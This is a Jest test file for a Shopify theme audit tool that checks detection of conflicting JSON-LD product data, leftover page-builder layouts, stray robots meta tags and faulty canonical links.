    expect(findings).toHaveLength(2);
    const types = findings.map((f) => f.description);
    expect(types.some((d) => d.includes("Product"))).toBe(true);
    expect(types.some((d) => d.includes("FAQPage"))).toBe(true);
  });

  it("handles malformed JSON gracefully", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{not valid json}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget"}</script>',
      ].join("\n"),
    };
    // Malformed block skipped, only one valid block — no conflict
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(0);
  });

  it("assigns HIGH severity by default", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "A"}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "B"}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  it("downgrades to LOW when inside a Liquid comment", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "A"}</script>',
        "{% comment %}",
        '<script type="application/ld+json">{"@type": "Product", "name": "B"}</script>',
        "{% endcomment %}",
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("attributes app when identifyAppFromJsonLd matches", () => {
    // Use a known Judge.me signature pattern
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "A"}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "B", "review": "judgeme"}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    // appName may or may not match depending on app-lookup signatures;
    // the important thing is the function doesn't throw
    expect(findings[0].findingType).toBe(FindingType.JSON_LD_CONFLICT);
  });

  it("reports correct line numbers for 2nd occurrence and mentions first in description", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        "<!-- line 1 -->",
        "<!-- line 2 -->",
        '<script type="application/ld+json">{"@type": "Product", "name": "A"}</script>',
        "<!-- line 4 -->",
        "<!-- line 5 -->",
        "<!-- line 6 -->",
        '<script type="application/ld+json">{"@type": "Product", "name": "B"}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(7);
    expect(findings[0].description).toContain("line 3");
  });

  it("emits findings for 2nd and 3rd blocks when three blocks share the same @type", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "A"}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "B"}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "C"}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(2);
    expect(findings[0].lineNumber).toBe(2);
    expect(findings[1].lineNumber).toBe(3);
    // Both should reference line 1 (the first occurrence)
    expect(findings[0].description).toContain("line 1");
    expect(findings[1].description).toContain("line 1");
  });

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "templates/product.liquid",
        content: [
          '<script type="application/ld+json">{"@type": "Product", "name": "A"}</script>',
          '<script type="application/ld+json">{"@type": "Product", "name": "B"}</script>',
        ].join("\n"),
      },
    ];
    const { findings } = scanThemeFiles(files);
    const conflictFindings = findingsOfType(findings, FindingType.JSON_LD_CONFLICT);
    expect(conflictFindings).toHaveLength(1);
    expect(conflictFindings[0].description).toContain("Product");
  });

  it("detects conflict between two @graph-wrapped Product nodes", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">',
        '{"@context": "https://schema.org", "@graph": [{"@type": "Product", "name": "Widget", "sku": "AAA"}]}',
        "</script>",
        '<script type="application/ld+json">',
        '{"@context": "https://schema.org", "@graph": [{"@type": "Product", "name": "Widget", "sku": "BBB"}]}',
        "</script>",
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("Product");
    expect(findings[0].description).toContain("line 1");
    expect(findings[0].lineNumber).toBe(4);
  });

  it("groups an array @type node with a plain-string @type node", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": ["Product", "Thing"], "name": "Widget", "sku": "AAA"}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "sku": "BBB"}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("Product");
  });

  it("detects conflict inside a top-level JSON array block", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content:
        '<script type="application/ld+json">[{"@type": "Product", "name": "A"}, {"@type": "Product", "name": "B"}]</script>',
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("Product");
  });

  it("catches an all-pairs conflict when block[0] and block[1] are identical but block[2] differs", () => {
    const same = '{"@type": "Product", "name": "Widget", "sku": "AAA"}';
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        `<script type="application/ld+json">${same}</script>`,
        `<script type="application/ld+json">${same}</script>`,
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "sku": "BBB"}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    // block[1] is an exact duplicate of block[0] (skipped); block[2] conflicts.
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(3);
    expect(findings[0].description).toContain("line 1");
  });

  it("treats key-reordered but semantically identical nodes as duplicates, not conflicts", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "sku": "AAA"}</script>',
        '<script type="application/ld+json">{"sku": "AAA", "name": "Widget", "@type": "Product"}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(0);
  });

  it("surfaces a conflicting Offer price between two Product blocks", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "price": "19.99", "priceCurrency": "USD"}}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "price": "24.99", "priceCurrency": "USD"}}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    // Base substrings preserved, plus the enriched offer clause.
    expect(findings[0].description).toContain('"@type": "Product"');
    expect(findings[0].description).toContain("line 1");
    expect(findings[0].description).toContain("offer price differs");
    expect(findings[0].description).toContain("19.99");
    expect(findings[0].description).toContain("24.99");
  });

  it("normalizes numeric vs string price when diffing offers", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "price": 19.99}}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "price": "19.99"}}</script>',
      ].join("\n"),
    };
    // The raw JSON differs (number 19.99 vs string "19.99"), so the generic
    // node-level conflict still fires. But the OFFER diff normalizes both to the
    // same string, so no misleading "offer price differs" clause is appended.
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).not.toContain("offer");
  });

  it("surfaces conflicting Offer availability and strips the schema.org URL prefix", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "availability": "https://schema.org/InStock"}}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "availability": "https://schema.org/OutOfStock"}}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("offer availability differs");
    expect(findings[0].description).toContain("InStock");
    expect(findings[0].description).toContain("OutOfStock");
    // The URL prefix must be stripped for readability.
    expect(findings[0].description).not.toContain("schema.org");
  });

  it("compares the first offer when offers is an array on one side", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": [{"@type": "Offer", "price": "19.99"}, {"@type": "Offer", "price": "99.99"}]}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "price": "24.99"}}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("offer price differs");
    expect(findings[0].description).toContain("19.99");
    expect(findings[0].description).toContain("24.99");
    // The second array element (99.99) is ignored: only the first offer counts.
    expect(findings[0].description).not.toContain("99.99");
  });

  it("surfaces conflicting price between two direct @type Offer nodes", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Offer", "price": "19.99", "priceCurrency": "USD"}</script>',
        '<script type="application/ld+json">{"@type": "Offer", "price": "24.99", "priceCurrency": "USD"}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('"@type": "Offer"');
    expect(findings[0].description).toContain("offer price differs");
    expect(findings[0].description).toContain("19.99");
    expect(findings[0].description).toContain("24.99");
  });

  it("lists multiple differing offer fields (price and availability)", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "price": "19.99", "availability": "https://schema.org/InStock"}}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "offers": {"@type": "Offer", "price": "24.99", "availability": "https://schema.org/OutOfStock"}}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("offer price differs");
    expect(findings[0].description).toContain("offer availability differs");
  });

  it("keeps the generic wording when the conflict is not offer-related", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: [
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "aggregateRating": {"@type": "AggregateRating", "ratingValue": "4.5"}}</script>',
        '<script type="application/ld+json">{"@type": "Product", "name": "Widget", "aggregateRating": {"@type": "AggregateRating", "ratingValue": "4.2"}}</script>',
      ].join("\n"),
    };
    const findings = detectJsonLdConflicts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('"@type": "Product"');
    expect(findings[0].description).toContain("line 1");
    // No offer field differs, so the description must not gain an offer clause.
    expect(findings[0].description).not.toContain("offer");
  });
});

// ---------------------------------------------------------------------------
// extractStaticProductCandidates (gc-47c.10)
// ---------------------------------------------------------------------------

describe("extractStaticProductCandidates", () => {
  it("extracts an unsigned static Product block with handle + price + availability", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      content: `<script type="application/ld+json">
{
  "@type": "Product",
  "name": "Blue Widget",
  "url": "https://shop.example.com/products/blue-widget?variant=1",
  "offers": {
    "@type": "Offer",
    "price": "19.99",
    "priceCurrency": "USD",
    "availability": "https://schema.org/InStock"
  }
}
</script>`,
    };
    const candidates = extractStaticProductCandidates(file);
    expect(candidates).toHaveLength(1);
    expect(candidates[0]).toMatchObject({
      filename: "sections/product.liquid",
      handle: "blue-widget",
      staticPrice: "19.99",
      staticPriceCurrency: "USD",
      staticAvailability: "InStock",
    });
    expect(candidates[0].codeSnippet).toContain("ld+json");
  });

  it("extracts sku when present on the offer", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      content: `<script type="application/ld+json">
{"@type":"Product","url":"https://s.com/products/x","offers":{"@type":"Offer","sku":"SKU-42","price":"5.00"}}
</script>`,
    };
    const candidates = extractStaticProductCandidates(file);
    expect(candidates).toHaveLength(1);
    expect(candidates[0].sku).toBe("SKU-42");
    expect(candidates[0].handle).toBe("x");
  });

  it("skips signed blocks (handled by detectGhostJsonLd)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: `<script type="application/ld+json">
{"@type":"Product","url":"https://judge.me/reviews/product123","offers":{"price":"9.99"}}
</script>`,
    };
    expect(extractStaticProductCandidates(file)).toHaveLength(0);
  });

  it("skips Liquid blocks (theme-rendered, not stale)", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      content: `<script type="application/ld+json">
{"@type":"Product","url":"https://s.com/products/{{ product.handle }}","offers":{"price":"1.00"}}
</script>`,
    };
    expect(extractStaticProductCandidates(file)).toHaveLength(0);
  });

  it("skips blocks with no resolvable identity (no handle, no sku)", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      content: `<script type="application/ld+json">
{"@type":"Product","name":"Nameless","offers":{"price":"1.00"}}
</script>`,
    };
    expect(extractStaticProductCandidates(file)).toHaveLength(0);
  });

  it("skips blocks with an identity but nothing to compare (no price, no availability)", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      content: `<script type="application/ld+json">
{"@type":"Product","url":"https://s.com/products/y","brand":"Acme"}
</script>`,
    };
    expect(extractStaticProductCandidates(file)).toHaveLength(0);
  });

  it("skips non-Product nodes", () => {
    const file: ThemeFile = {
      filename: "sections/faq.liquid",
      content: `<script type="application/ld+json">
{"@type":"FAQPage","url":"https://s.com/products/z","offers":{"price":"1.00"}}
</script>`,
    };
    expect(extractStaticProductCandidates(file)).toHaveLength(0);
  });

  it("extracts Product nodes nested in an @graph wrapper", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      content: `<script type="application/ld+json">
{"@graph":[{"@type":"WebPage"},{"@type":"Product","url":"https://s.com/products/graph-prod","offers":{"price":"12.34","priceCurrency":"EUR"}}]}
</script>`,
    };
    const candidates = extractStaticProductCandidates(file);
    expect(candidates).toHaveLength(1);
    expect(candidates[0].handle).toBe("graph-prod");
    expect(candidates[0].staticPrice).toBe("12.34");
  });

  it("does not extract from non-scannable-agnostic malformed JSON", () => {
    const file: ThemeFile = {
      filename: "sections/product.liquid",
      content: `<script type="application/ld+json">{ not valid json </script>`,
    };
    expect(extractStaticProductCandidates(file)).toHaveLength(0);
  });

  it("surfaces candidates through scanThemeFiles without emitting findings for them", () => {
    const files: ThemeFile[] = [
      {
        filename: "sections/product.liquid",
        content: `<script type="application/ld+json">
{"@type":"Product","url":"https://s.com/products/pooled","offers":{"price":"7.77"}}
</script>`,
      },
    ];
    const result = scanThemeFiles(files);
    expect(result.staticProductCandidates).toHaveLength(1);
    expect(result.staticProductCandidates?.[0].handle).toBe("pooled");
    // The static unsigned Product block must NOT itself produce a JSON-LD finding.
    expect(findingsOfType(result.findings, FindingType.GHOST_JSON_LD)).toHaveLength(0);
  });

  it("truncates over-long identity and offer strings to 255 chars (gc-4ce step-output bound)", () => {
    const long = "S".repeat(9000);
    const file: ThemeFile = {
      filename: "snippets/ld.liquid",
      content: `<script type="application/ld+json">{"@type":"Product","url":"https://s.com/products/${"h".repeat(9000)}","sku":"${long}","offers":{"price":"${"9".repeat(9000)}","priceCurrency":"${"U".repeat(9000)}","availability":"${"I".repeat(9000)}"}}</script>`,
    };
    const [candidate] = extractStaticProductCandidates(file);
    expect(candidate.handle).toHaveLength(255);
    expect(candidate.sku).toHaveLength(255);
    expect(candidate.staticPrice).toHaveLength(255);
    expect(candidate.staticPriceCurrency).toHaveLength(255);
    expect(candidate.staticAvailability).toHaveLength(255);
    expect(candidate.sku).toBe(long.slice(0, 255));
  });

  it("keeps 500 long-SKU candidates under the step-output budget (audit static.ts shape)", () => {
    const sku = "S".repeat(9000);
    const files: ThemeFile[] = Array.from({ length: 6 }, (_, f) => ({
      filename: `snippets/ld-${f}.liquid`,
      content: Array.from(
        { length: 100 },
        (_, i) =>
          `<script type="application/ld+json">{"@type":"Product","sku":"${sku}${f}-${i}","offers":{"price":"9.99"}}</script>`,
      ).join("\n"),
    }));
    const candidates = files.flatMap((f) => extractStaticProductCandidates(f));
    const bounded = candidates.slice(0, JSONLD_PRICE_CANDIDATE_CAP);
    expect(bounded).toHaveLength(JSONLD_PRICE_CANDIDATE_CAP);
    const bytes = Buffer.byteLength(JSON.stringify({ staticProductCandidates: bounded }), "utf8");
    expect(bytes).toBeLessThan(CORE_STEP_OUTPUT_BUDGET_BYTES / 3);
  });
});

// ---------------------------------------------------------------------------
// detectGhostLayouts
// ---------------------------------------------------------------------------

describe("detectGhostLayouts", () => {
  it("detects PageFly layout", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.pagefly.liquid",
        content: "<html>PageFly layout content</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_LAYOUT);
    expect(findings[0].appName).toBe("PageFly");
    expect(findings[0].filename).toBe("layout/theme.pagefly.liquid");
    expect(findings[0].description).toContain("PageFly");
  });

  it("detects GemPages layout", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.gempages.liquid",
        content: "<html>GemPages layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("GemPages");
  });

  it("detects Shogun layout", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.shogun.liquid",
        content: "<html>Shogun layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Shogun");
  });

  it("detects gem- prefix layout as GemPages", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/gem-landing.liquid",
        content: "<html>GemPages landing layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("GemPages");
  });

  it("skips theme.liquid", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: "<html>Main theme layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(0);
  });

  it("skips password.liquid", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/password.liquid",
        content: "<html>Password layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(0);
  });

  it("skips checkout.liquid", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/checkout.liquid",
        content: "<html>Checkout layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(0);
  });

  it("detects unknown app layout matching theme.*.liquid pattern", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.unknownapp.liquid",
        content: "<html>Unknown app layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBeUndefined();
    expect(findings[0].description).toContain("likely left by an uninstalled page builder");
  });

  it("skips custom merchant layout that does not match app patterns", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/landing.liquid",
        content: "<html>Custom landing layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(0);
  });

  it("detects multiple ghost layouts", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: "<html>Main layout</html>",
      },
      {
        filename: "layout/theme.pagefly.liquid",
        content: "<html>PageFly layout</html>",
      },
      {
        filename: "layout/theme.gempages.liquid",
        content: "<html>GemPages layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(2);
    const appNames = findings.map((f) => f.appName);
    expect(appNames).toContain("PageFly");
    expect(appNames).toContain("GemPages");
  });

  it("assigns MEDIUM severity by default", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.pagefly.liquid",
        content: "<html>PageFly layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings[0].severity).toBe(Severity.MEDIUM);
  });

  it("downgrades to LOW when content is inside a Liquid comment", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.pagefly.liquid",
        content: "{% comment %}\n<html>PageFly layout</html>\n{% endcomment %}",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("truncates code snippet to 300 characters", () => {
    const longContent = "x".repeat(500);
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.pagefly.liquid",
        content: longContent,
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings[0].codeSnippet).toHaveLength(300);
  });

  it("sets lineNumber to 1", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.pagefly.liquid",
        content: "<html>PageFly layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings[0].lineNumber).toBe(1);
  });

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.liquid",
        content: "<html>{{ content_for_layout }}</html>",
      },
      {
        filename: "layout/theme.pagefly.liquid",
        content: "<html>PageFly layout content</html>",
      },
    ];
    const { findings } = scanThemeFiles(files);
    const layoutFindings = findingsOfType(findings, FindingType.GHOST_LAYOUT);
    expect(layoutFindings).toHaveLength(1);
    expect(layoutFindings[0].appName).toBe("PageFly");
  });

  it("attributes via file content when filename does not match known patterns", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.custombuilder.liquid",
        content: '<html><script src="https://cdn.pagefly.io/pagefly.js"></script></html>',
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(1);
    // Should be attributed via identifyAppFromCode matching pagefly pattern in content
    expect(findings[0].appName).toBe("PageFly");
  });

  it("detects Zipify layout", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.zipify.liquid",
        content: "<html>Zipify layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("Zipify Pages");
  });

  it("detects EComSolid layout", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.ecomsolid.liquid",
        content: "<html>EComSolid layout</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(1);
    expect(findings[0].appName).toBe("EComSolid");
  });

  it("ignores non-layout files", () => {
    const files: ThemeFile[] = [
      {
        filename: "snippets/theme.pagefly.liquid",
        content: "<html>Not a layout file</html>",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(0);
  });

  it("ignores non-liquid files in layout directory", () => {
    const files: ThemeFile[] = [
      {
        filename: "layout/theme.pagefly.json",
        content: "{}",
      },
    ];
    const findings = detectGhostLayouts(files);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// detectGhostRobots
// ---------------------------------------------------------------------------

describe("detectGhostRobots", () => {
  it("detects static noindex meta robots", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<meta name="robots" content="noindex">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_ROBOTS);
    expect(findings[0].description).toContain("noindex");
  });

  it("detects nofollow", () => {
    const file: ThemeFile = {
      filename: "templates/collection.liquid",
      content: '<meta name="robots" content="nofollow">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("nofollow");
  });

  it("detects none", () => {
    const file: ThemeFile = {
      filename: "templates/page.liquid",
      content: '<meta name="robots" content="none">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("none");
  });

  it("detects noindex,nofollow combo", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<meta name="robots" content="noindex, nofollow">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("noindex, nofollow");
  });

  it("skips index,follow (permissive directive)", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<meta name="robots" content="index, follow">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(0);
  });

  it("skips conditional robots (Liquid if)", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '{% if template == "404" %}<meta name="robots" content="noindex">{% endif %}',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(0);
  });

  it("skips conditional robots (Liquid unless)", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content:
        '{%- unless request.page_type == "index" -%}<meta name="robots" content="noindex">{%- endunless -%}',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(0);
  });

  it("detects with content before name (attribute order variant)", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<meta content="noindex" name="robots">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_ROBOTS);
  });

  it("severity is HIGH by default", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<meta name="robots" content="noindex">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  it("severity is LOW inside Liquid comment", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '{% comment %}<meta name="robots" content="noindex">{% endcomment %}',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.LOW);
  });

  it("is included in scanThemeFiles results", () => {
    const files: ThemeFile[] = [
      {
        filename: "templates/product.liquid",
        content: '<meta name="robots" content="noindex">',
      },
    ];
    const result = scanThemeFiles(files);
    const robotsFindings = findingsOfType(result.findings, FindingType.GHOST_ROBOTS);
    expect(robotsFindings).toHaveLength(1);
  });

  it("detects orphaned GPTBot noindex directive", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<meta name="GPTBot" content="noindex">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_ROBOTS);
    expect(findings[0].description).toContain("noindex");
  });

  it("detects orphaned ClaudeBot nofollow directive with content before name", () => {
    const file: ThemeFile = {
      filename: "templates/collection.liquid",
      content: '<meta content="nofollow" name="ClaudeBot">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("nofollow");
  });

  it("skips permissive AI-crawler directive (index, follow)", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<meta name="PerplexityBot" content="index, follow">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(0);
  });

  it("skips conditional AI-crawler robots (Liquid if)", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '{% if template == "404" %}<meta name="Google-Extended" content="none">{% endif %}',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(0);
  });

  it("does not treat an arbitrary meta name as robots-like", () => {
    const file: ThemeFile = {
      filename: "templates/product.liquid",
      content: '<meta name="description" content="noindex">',
    };
    const findings = detectGhostRobots(file);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// detectGhostCanonical
// ---------------------------------------------------------------------------

describe("detectGhostCanonical", () => {
  // --- Detection cases ---

  it("detects empty canonical href", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="canonical" href="">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_CANONICAL);
    expect(findings[0].description).toContain("Empty canonical href");
  });

  it("detects whitespace-only canonical href", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="canonical" href="   ">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_CANONICAL);
    expect(findings[0].description).toContain("Empty canonical href");
  });

  it("detects unresolved Liquid variable in href", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="canonical" href="{{ seo_canonical_url }}">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_CANONICAL);
    expect(findings[0].description).toContain("Unresolved Liquid variable");
  });

  it("detects unresolved complex Liquid variable with filter", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<link rel="canonical" href="{{ canonical_override | strip }}">',
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_CANONICAL);
    expect(findings[0].description).toContain("Unresolved Liquid variable");
  });

  it("detects duplicate canonical tags in same file (flags 2nd)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<link rel="canonical" href="{{ canonical_url }}">',
        '<link rel="canonical" href="{{ canonical_url }}">',
      ].join("\n"),
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_CANONICAL);
    expect(findings[0].description).toContain("Duplicate canonical tag");
    expect(findings[0].lineNumber).toBe(2);
  });

  it("detects app-attributed canonical via code context", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "<!-- avada-seo canonical override -->",
        '<link rel="canonical" href="https://mystore.com/products/thing">',
      ].join("\n"),
    };
    const findings = detectGhostCanonical(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.GHOST_CANONICAL);
    expect(findings[0].appName).toBe("Avada SEO Suite");
    expect(findings[0].description).toContain("App-attributed canonical");
  });

